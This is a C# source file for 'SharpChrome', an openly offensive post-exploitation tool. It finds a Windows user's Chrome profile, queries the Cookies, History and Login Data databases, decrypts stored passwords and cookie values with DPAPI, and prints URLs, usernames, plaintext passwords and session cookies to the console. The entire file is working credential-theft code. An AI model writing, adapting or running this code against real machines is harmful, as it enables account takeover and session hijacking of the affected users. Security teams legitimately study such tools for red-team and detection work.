using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;

namespace SharpChrome
{
    using CS_SQLite3;
    class Program
    {
        static void Usage()
        {
            string banner = @"
Usage:
    .\SharpChrome.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chrome Cookies, History and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains.
";

            Console.WriteLine(banner);
        }

        static void Main(string[] args)
        {
            // Path builder for Chrome install location
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            string[] paths = new string[2];
            paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data";
            paths[1] = localAppData + "\\Google\\Chrome\\User Data";
            //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";

            string[] validArgs = { "all", "full", "logins", "history", "cookies" };

            bool getCookies = false;
            bool getHistory = false;
            bool getBookmarks = false;
            bool getLogins = false;
            bool useTmpFile = false;
            bool useBCryptDecryption = false;

            ChromeCredentialManager chromeManager = new ChromeCredentialManager();

            // For filtering cookies
            List<String> domains = new List<String>();

            if (args.Length == 0)
            {
                Usage();
                return;
            }

            // Parse the arguments.
            for (int i = 0; i < args.Length; i++)
            {
                // Valid arg!
                string arg = args[i].ToLower();
                if (Array.IndexOf(validArgs, arg) != -1)
                {
                    if (arg == "all" || arg == "full")
                    {
                        getCookies = true;
                        getHistory = true;
                        getLogins = true;
                    }
                    else if (arg == "logins")
                    {
                        getLogins = true;
                    }
                    else if (arg == "history")
                    {
                        getHistory = true;
                    }
                    else if (arg == "cookies")
                    {
                        getCookies = true;
                    }
                    else
                    {
                        Console.WriteLine("[X] Invalid argument passed: {0}", arg);
                    }
                }
                else if (getCookies && arg.Contains("."))
                {
                    // must be a domain!
                    domains.Add(arg);
                }
                else
                {
                    Console.WriteLine("[X] Invalid argument passed: {0}", arg);
                }
            }

            string[] domainArray = domains.ToArray();

            if (!getCookies && !getHistory && !getLogins)
            {
                Usage();
                return;
            }

            
            // Main loop, path parsing and high integrity check taken from GhostPack/SeatBelt
            try
            {
                if (getCookies)
                {
                    var cookies = chromeManager.GetCookies();
                    if (domainArray != null && domainArray.Length > 0)
                    {
                        foreach(var domain in domainArray)
                        {
                            var subCookies = HostCookies.FilterHostCookies(cookies, domain);
                            subCookies.Print();
                        }
                    } else
                    {
                        foreach (var cookie in cookies)
                        {
                            cookie.Print();
                        }
                    }
                }

                if (getHistory)
                {
                    var history = chromeManager.GetHistory();
                    foreach(var item in history)
                    {
                        item.Print();
                    }
                }

                if (getLogins)
                {
                    var logins = chromeManager.GetSavedLogins();
                    foreach(var login in logins)
                    {
                        login.Print();
                    }
                }

                Console.WriteLine("[*] Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}\n\n{1}", ex.Message, ex.StackTrace);
            }
        }

        private static bool ChromeExists(string[] paths)
        {
            foreach(string path in paths)
            {
                if (File.Exists(path))
                {
                    return true;
                }
            }
            return false;
        }

        private static string CreateTempFile(string filePath)
        {
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string newFile = "";
            newFile = Path.GetRandomFileName();
            string tempFileName = localAppData + "\\Temp\\" + newFile;
            File.Copy(filePath, tempFileName);
            return tempFileName;
        }

        public static HostCookies[] SortCookieData(DataTable cookieTable)
        {
            List<Cookie> cookies = new List<Cookie>();
            List<HostCookies> hostCookies = new List<HostCookies>();
            HostCookies hostInstance = null;
            string lastHostKey = "";
            foreach (DataRow row in cookieTable.Rows)
            {
                if (row["host_key"].GetType() != typeof(System.DBNull) && lastHostKey != (string)row["host_key"])
                {
                    lastHostKey = (string)row["host_key"];
                    if (hostInstance != null)
                    {
                        hostInstance.Cookies = cookies.ToArray();
                        hostCookies.Add(hostInstance);
                    }
                    hostInstance = new HostCookies();
                    hostInstance.HostName = lastHostKey;
                    cookies = new List<Cookie>();
                }
                Cookie cookie = new Cookie();
                cookie.Domain = row["host_key"].ToString();
                long expDate;
                Int64.TryParse(row["expires_utc"].ToString(), out expDate);
                // https://github.com/djhohnstein/SharpChrome/issues/1
                cookie.ExpirationDate = (expDate / 1000000) - 11644473600;
                cookie.HostOnly = false; // I'm not sure this is stored in the cookie store and seems to be always false
                if (row["is_httponly"].ToString() == "1")
                {
                    cookie.HttpOnly = true;
                }
                else
                {
                    cookie.HttpOnly = false;
                }
                cookie.Name = row["name"].ToString();
                cookie.Path = row["path"].ToString();
                // cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
                if (row["is_secure"].ToString() == "1")
                {
                    cookie.Secure = true;
                }
                else
                {
                    cookie.Secure = false;
                }
                cookie.Session = false; // Unsure, this seems to be false always
                cookie.StoreId = "0"; // Static
                byte[] cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
                cookieValue = ProtectedData.Unprotect(cookieValue, null, DataProtectionScope.CurrentUser);
                cookie.Value = System.Text.Encoding.ASCII.GetString(cookieValue);
                cookies.Add(cookie);
            }
            return hostCookies.ToArray();
        }

        private bool CookieHostNameMatch(HostCookies cookie, string hostName)
        {
            return cookie.HostName == hostName;
        }

        public static HostCookies FilterHostCookies(HostCookies[] hostCookies, string url)
        {
            HostCookies results = new HostCookies();
            List<String> hostPermutations = new List<String>();
            // First retrieve the domain from the url
            string domain = url;
            // determine if url or raw domain name
            if (domain.IndexOf('/') != -1)
            {
                domain = domain.Split('/')[2];
            }
            results.HostName = domain;
            string[] domainParts = domain.Split('.');
            for (int i = 0; i < domainParts.Length; i++)
            {
                if ((domainParts.Length - i) < 2)
                {
                    // We've reached the TLD. Break!
                    break;
                }
                string[] subDomainParts = new string[domainParts.Length - i];
                Array.Copy(domainParts, i, subDomainParts, 0, subDomainParts.Length);
                string subDomain = String.Join(".", subDomainParts);
                hostPermutations.Add(subDomain);
                hostPermutations.Add("." + subDomain);
            }
            List<Cookie> cookies = new List<Cookie>();
            foreach (string sub in hostPermutations)
            {
                // For each permutation
                foreach (HostCookies hostInstance in hostCookies)
                {
                    // Determine if the hostname matches the subdomain perm
                    if (hostInstance.HostName.ToLower().Contains(sub.ToLower()))
                    {
                        // If it does, cycle through
                        foreach (Cookie cookieInstance in hostInstance.Cookies)
                        {
                            // No dupes
                            if (!cookies.Contains(cookieInstance))
                            {
                                cookies.Add(cookieInstance);
                            }
                        }
                    }
                }
            }
            results.Cookies = cookies.ToArray();
            return results;

        }

        public static HostCookies[] ParseChromeCookies(string cookiesFilePath, string user, bool printResults = false, string[] domains = null)
        {
            SQLiteDatabase database = new SQLiteDatabase(cookiesFilePath);
            string query = "SELECT * FROM cookies ORDER BY host_key";
            DataTable resultantQuery = database.ExecuteQuery(query);
            database.CloseDatabase();
            // This will group cookies based on Host Key
            HostCookies[] rawCookies = SortCookieData(resultantQuery);
            if (printResults)
            {
                if (domains != null)
                {
                    foreach (string domain in domains)
                    {
                        HostCookies hostInstance = FilterHostCookies(rawCookies, domain);
                        Console.WriteLine("--- Chrome Cookie (User: {0}) ---", user);
                        Console.WriteLine("Domain         : {0}", hostInstance.HostName);
                        Console.WriteLine("Cookies (JSON) : {0}", hostInstance.ToJSON());
                        Console.WriteLine();
                    }
                }
                else
                {
                    foreach (HostCookies cookie in rawCookies)
                    {
                        Console.WriteLine("--- Chrome Cookie (User: {0}) ---", user);
                        Console.WriteLine("Domain         : {0}", cookie.HostName);
                        Console.WriteLine("Cookies (JSON) : {0}", cookie.ToJSON());
                        Console.WriteLine();
                    }
                }
            }
            // Parse the raw cookies into HostCookies that are grouped by common domain
            return rawCookies;
        }

        public static void ParseChromeHistory(string historyFilePath, string user, HostCookies[] cookies)
        {
            SQLiteDatabase database = new SQLiteDatabase(historyFilePath);
            string query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count;";
            DataTable resultantQuery = database.ExecuteQuery(query);
            database.CloseDatabase();
            foreach (DataRow row in resultantQuery.Rows)
            {
                var lastVisitTime = row["last_visit_time"];
                Console.WriteLine("--- Chrome History (User: {0}) ---", user);
                Console.WriteLine("URL           : {0}", row["url"]);
                if (row["title"] != String.Empty)
                {
                    Console.WriteLine("Title         : {0}", row["title"]);
                }
                else
                {
                    Console.WriteLine("Title         : No Title");
                }
                Console.WriteLine("Visit Count   : {0}", row["visit_count"]);
                HostCookies matching = FilterHostCookies(cookies, row["url"].ToString());
                Console.WriteLine("Cookies       : {0}", matching.ToJSON());
                Console.WriteLine();
            }
        }

        public static void ParseChromeLogins(string loginDataFilePath, string user)
        {
            SQLiteDatabase database = new SQLiteDatabase(loginDataFilePath);
            string query = "SELECT action_url, username_value, password_value FROM logins";
            DataTable resultantQuery = database.ExecuteQuery(query);

            foreach (DataRow row in resultantQuery.Rows)
            {
                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                byte[] decBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser);
                string password = Encoding.ASCII.GetString(decBytes);
                if (password != String.Empty)
                {
                    Console.WriteLine("--- Chrome Credential (User: {0}) ---", user);
                    Console.WriteLine("URL      : {0}", row["action_url"]);
                    Console.WriteLine("Username : {0}", row["username_value"]);
                    Console.WriteLine("Password : {0}", password);
                    Console.WriteLine();
                }
            }
            database.CloseDatabase();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
